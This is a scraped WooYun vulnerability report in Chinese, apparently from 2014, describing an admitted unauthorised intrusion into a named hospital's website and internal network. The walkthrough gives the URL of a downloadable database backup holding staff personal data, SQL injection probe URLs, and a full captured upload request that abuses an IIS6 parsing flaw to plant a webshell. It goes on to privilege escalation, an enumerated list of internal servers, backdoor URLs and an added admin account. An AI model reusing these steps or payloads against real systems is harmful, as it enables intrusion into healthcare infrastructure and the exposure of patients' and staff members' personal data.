{"id": 4227, "wybug_id": "wooyun-2014-055233", "wybug_title": "某大型医院可从web入侵到内网渗透", "wybug_corp": "西京医院", "wybug_author": "卡卡", "wybug_date": "2014-04-01 17:38", "wybug_open_date": "2014-05-16 17:39", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-16：\t细节向公众公开  简要描述： 某大型医院web入侵到内网渗透 详细说明：  首先是数据库备份文件可被下载链接：\nhttp://xjwww.fmmu.edu.cn/D.rar\n\n\n我看了下，虽然是很早的数据，但是还是有些信息，各种小护士联系电话，身份证号，住址，姓名.而且对下一步的渗透也埋下了伏笔第二处就是主站存在明显注入：漏洞链接：\nhttp://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1\n加单引号爆错，并且爆出了绝对路径\nMicrosoft JET Database Engine 错误 '80040e14' 语法错误 (操作符丢失) 在查询表达式 'uid=1' and sh='1' ORDER BY time DESC' 中。 D:\\西京医院主站20130718\\BZXXQ\\../inc/cls_main.asp，行 303\n进一步确定存在注入http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=1http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=2返回结果不同，存在sql注射，刚才我们也得到了数据库结构，所以呢，数据库的所有东西已经一目了然了第三处问题存在上传漏洞，这个更是致命的，直接getshell问题链接：\nhttp://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp\n上传用burp抓包，分析post包，可以看到，对filepath是可控的，由于站点web容器为iis6，所以结合iis6解析漏洞，可以直接getshell\nPOST /Talents/base/fj_upfile.asp HTTP/1.1Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*DNT: 1Referer: http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.aspAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)Content-Type: multipart/form-data; boundary=---------------------------7de3992b201b6Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 5402Host: xjwww.fmmu.edu.cnPragma: no-cacheCookie: _pk_id.46.8753=003ff2d41d9fcfc8.1396338965.1.1396341021.1396338965.; _pk_ses.46.8753=*; CNZZDATA2369866=cnzz_eid%3D472799282-1396338970-%26ntime%3D1396338970%26cnzz_a%3D5%26ltime%3D1396338964750; ASPSESSIONIDSSBBRBDQ=FPFHAHDBMBBCPEOHELFHGLMH-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"filepath\"/UploadFile/-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"act\"upload-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"file1\"; filename=\"a.jpg\"Content-Type: image/gif\n修改post包，上传shell\n\n查看源码得到shell地址\n\n上菜刀\n\n简单提权，得到服务器权限\n服务器名称            注释-------------------------------------------------------------------------------\\\\BLBSJYS-WEB2072                                                              \\\\CLOUD-SQL2008R2      VMware vSphere Database                                 \\\\CLOUD-VCENTER        VMware vSphere vCenter                                  \\\\CSK-WEB207197                                                                \\\\FMHZL-WEB            fmhzl-web                                               \\\\FSK-WEB207198                                                                \\\\GK-WEB207203                                                                 \\\\GXGL-WEB             肝血管瘤                                                \\\\HXK-WEB207204                                                                \\\\HYX-WEB207199                                                                \\\\JYK-WEB207205                                                                \\\\JYKSYJPKC-WEB20                                                              \\\\LLK-WEB207201                                                                \\\\LNBK-WEB207200                                                               \\\\MNWK-WEB207207                                                               \\\\MZK-WEB207206                                                                \\\\NFMK-WEB207196                                                               \\\\PFYY-WEB207215                                                               \\\\RBH-WEB207222                                                                \\\\RK-WEB207195                                                                 \\\\SHARE-SERVER                                                                 \\\\SXK-WEB207201                                                                \\\\SZNK-WEB207197                                                               \\\\XGNFMWK-WEB2072                                                              \\\\XHWK-WEB207200                                                               \\\\XJFCK-WEB                                                                    \\\\XJHYX-WEB                                                                    \\\\XJMZK-WEB                                                                    \\\\XJSSK-WEB                                                                    \\\\XJYY-WEB207193                                                               \\\\XJYYB-WEB207194                                                              \\\\XJZLK-WEB207196                                                              \\\\XJZYZ-WEB207195                                                              \\\\XSK-WEB207208                                                                \\\\XXGWK-WEB207202                                                              \\\\YJK-CHINESE-WEB                                                              \\\\YJK-ENGLISH-WEB                                                              \\\\YJK-WEB207198                                                                \\\\YK-WEB207210                                                                 \\\\ZLFSZX-WEB20721                                                              \\\\ZXWK-WEB207212                                                               \\\\ZYK-WEB                                                                      \\\\绿盟服务器25510\n内网机器可能不止这些，不过如果要是继续下去，各种病人，医院工作人员的个人信息很可能会泄漏，希望能引起重视，另外发现别人的后门http://xjwww.fmmu.edu.cn/x.asp本次测试上传后门：http://xjwww.fmmu.edu.cn/UploadFile/1.asp;20144117046.gifhttp://xjwww.fmmu.edu.cn/asp/help.asp添加管理帐号 test test 原谅我未授权就检测！！！   漏洞证明：  \nhttp://xjwww.fmmu.edu.cn/D.rar\n\n\n明显注入：\nhttp://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1\n加单引号爆错，并且爆出了绝对路径\nMicrosoft JET Database Engine 错误 '80040e14' 语法错误 (操作符丢失) 在查询表达式 'uid=1' and sh='1' ORDER BY time DESC' 中。 D:\\西京医院主站20130718\\BZXXQ\\../inc/cls_main.asp，行 303\n进一步确定存在注入http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=1http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=2返回结果不同，存在sql注射，刚才我们也得到了数据库结构，所以呢，数据库的所有东西已经一目了然了第三处问题存在上传漏洞，这个更是致命的，直接getshell问题链接：\nhttp://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp\n上传用burp抓包，分析post包，可以看到，对filepath是可控的，由于站点web容器为iis6，所以结合iis6解析漏洞，可以直接getshell\nPOST /Talents/base/fj_upfile.asp HTTP/1.1Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*DNT: 1Referer: http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.aspAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)Content-Type: multipart/form-data; boundary=---------------------------7de3992b201b6Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 5402Host: xjwww.fmmu.edu.cnPragma: no-cacheCookie: _pk_id.46.8753=003ff2d41d9fcfc8.1396338965.1.1396341021.1396338965.; _pk_ses.46.8753=*; CNZZDATA2369866=cnzz_eid%3D472799282-1396338970-%26ntime%3D1396338970%26cnzz_a%3D5%26ltime%3D1396338964750; ASPSESSIONIDSSBBRBDQ=FPFHAHDBMBBCPEOHELFHGLMH-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"filepath\"/UploadFile/-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"act\"upload-----------------------------7de3992b201b6Content-Disposition: form-data; name=\"file1\"; filename=\"a.jpg\"Content-Type: image/gif\n修改post包，上传shell\n\n查看源码得到shell地址\n\n上菜刀\n\n简单提权，得到服务器权限\n服务器名称            注释-------------------------------------------------------------------------------\\\\BLBSJYS-WEB2072                                                              \\\\CLOUD-SQL2008R2      VMware vSphere Database                                 \\\\CLOUD-VCENTER        VMware vSphere vCenter                                  \\\\CSK-WEB207197                                                                \\\\FMHZL-WEB            fmhzl-web                                               \\\\FSK-WEB207198                                                                \\\\GK-WEB207203                                                                 \\\\GXGL-WEB             肝血管瘤                                                \\\\HXK-WEB207204                                                                \\\\HYX-WEB207199                                                                \\\\JYK-WEB207205                                                                \\\\JYKSYJPKC-WEB20                                                              \\\\LLK-WEB207201                                                                \\\\LNBK-WEB207200                                                               \\\\MNWK-WEB207207                                                               \\\\MZK-WEB207206                                                                \\\\NFMK-WEB207196                                                               \\\\PFYY-WEB207215                                                               \\\\RBH-WEB207222                                                                \\\\RK-WEB207195                                                                 \\\\SHARE-SERVER                                                                 \\\\SXK-WEB207201                                                                \\\\SZNK-WEB207197                                                               \\\\XGNFMWK-WEB2072                                                              \\\\XHWK-WEB207200                                                               \\\\XJFCK-WEB                                                                    \\\\XJHYX-WEB                                                                    \\\\XJMZK-WEB                                                                    \\\\XJSSK-WEB                                                                    \\\\XJYY-WEB207193                                                               \\\\XJYYB-WEB207194                                                              \\\\XJZLK-WEB207196                                                              \\\\XJZYZ-WEB207195                                                              \\\\XSK-WEB207208                                                                \\\\XXGWK-WEB207202                                                              \\\\YJK-CHINESE-WEB                                                              \\\\YJK-ENGLISH-WEB                                                              \\\\YJK-WEB207198                                                                \\\\YK-WEB207210                                                                 \\\\ZLFSZX-WEB20721                                                              \\\\ZXWK-WEB207212                                                               \\\\ZYK-WEB                                                                      \\\\绿盟服务器25510\n   修复方案：  各种修复把！安全实在不敢恭维。。   版权声明：转载请注明来源 卡卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-04-05 21:33 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-06 17:02 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  此类问题 作为成功的入侵事件提交 不知道是否会遇到法律问题，内网指的是防火墙后NAT前网络把，而不是那种物理隔离的网络对不洞主    \n     2014-04-06 17:54 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @abaddon 检测是时候，做到心中有数，点到为止，我想应该没什么问题    \n     2014-04-28 11:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  \\\\x盟服务器25510 这个是什么情况啊？    \n     2014-04-28 19:42 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @卡卡 这个回头我们应该一块研究下 老研究单机问题太虐心了 而成功的入侵事件我没找到合理的法律解释    \n     2014-05-16 18:16 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  绿盟服务器    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}